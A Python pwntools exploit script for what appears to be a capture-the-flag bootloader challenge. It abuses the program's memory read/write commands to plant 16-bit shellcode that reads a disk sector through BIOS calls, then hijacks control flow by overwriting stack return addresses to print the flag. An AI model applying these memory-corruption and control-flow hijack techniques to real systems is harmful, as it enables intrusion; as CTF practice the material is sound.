from pwn import *

disk_path = "/tmp/boot.bin"
context.arch = "i386"

# io = process(["qemu-system-i386", "-s", "-display", "none", "-serial", "mon:stdio", disk_path])
io = remote("localhost", 1337)

# def dumpall():
#     def _dumpall():
#         while io.can_recv(timeout=0.1):
#             o = io.recvline(timeout=0.1).decode().strip()
#             if len(o) == 0:
#                 break
#             print(o)

#     _dumpall()
#     _dumpall()

def rl():
    return io.recvuntil(b"\r\n").strip()

def sl(b):
    io.send(b + b"\r")
    # echo
    n = len(b) + 1
    while n > 0:
        n -= len(io.recv(1))


def write_word(what, to):
    # to is an address [0x0000, 0xffff]
    # we have to send an offset from 0x6000, divided by 2
    # because we are writing 2 bytes at a time
    # so we have to send (to - 0x6000) / 2
    slot = ((to - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"w {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    io.recvuntil(b"hexword]> ")

    target_val = hex(what)[2:].rjust(4, "0")
    info(f"Sending {target_val} -> {target_slot}")
    sl(target_val.encode())

def read_word(from_):
    slot = ((from_ - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"r {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    ss = rl()
    info(f"Reading {target_slot} -> {ss.decode()}")
    return int(ss.decode(), 16)


def write_contiguous(pl, to=0x6000):
    word_list = []
    for i in range(0, len(pl), 2):
        word_list.append(u16(pl[i:i+2]))
    for w in word_list:
        write_word(w, to)
        to += 2

def comm_test():
    io.recvuntil(b"> ")
    sl(b"R 0000")
    ss = rl()
    info(ss.decode())

    io.recvuntil(b"> ")
    sl(b"W 0000")
    io.recvuntil(b"hexword]> ")
    sl(b"dead")

    io.recvuntil(b"> ")
    sl(b"R 0000")
    ss = rl()
    info(ss.decode())
    input()

# This real mode 16-bits shellcode will read the second sector of the disk using BIOS Apis
# https://stanislavs.org/helppc/int_13-2.html

shellcode = """
; org 0x6000
bits 16

mov ah, 2
mov al, 1
mov bx, 0x7080 ; <- target address
mov cx, 0x0002     ; <- cyl:sector
mov dx, 0x0080    ; <- head:disk number ( or 0x80 to indicate hdd and not floppy)
int 0x13

mov bx, 0x7080
loop:
    mov al, [bx]
    mov dx, 0x3f8 ; putc(al)
    out dx, al
    inc bx
    cmp bx, 0x70b0
        jne loop


hlt
"""

open("shellcode.S", "w").write(shellcode)
info("Assembling shellcode...")
os.system("nasm -f bin shellcode.S -o /tmp/payload")
payload = open("/tmp/payload", "rb").read()
write_contiguous(payload)
write_word(0x6000, 0x6900)

# execute the shellcode by overwriting code with a jump to our code

COM_BUFFER_ADDR = 0x7c10

# we write a code address to the buffer where stuff gets written
# so that we can write raw shellcode (hopefully without control bytes)
# and it will get executed when cf reaches there

# or we can write a `stack` address and spray it with a retaddr that points to our shellcode
# (we'll use this one)

# stack is 0x9000 growing down, we can write 64 bytes generally, but we don't want to overwrite the
# retaddr for getc so we have to be careful and take some lower call
write_word(0x9000 - 8 , COM_BUFFER_ADDR)

io.recvuntil(b"> ")
sl(p16(0x6000) * 4)

flag = io.recv()

info(f"Flag: {flag}")

input()
